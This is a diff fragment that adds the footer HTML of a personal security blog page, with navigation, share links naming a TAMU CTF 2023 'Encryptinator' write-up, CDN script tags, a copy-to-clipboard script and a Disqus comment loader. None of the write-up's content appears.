+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&text=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&is_video=false&description=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tamu CTF 2023 - Encryptinator (pwn, oob read)&body=Check out this article: https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&name=Tamu CTF 2023 - Encryptinator (pwn, oob read)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&t=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
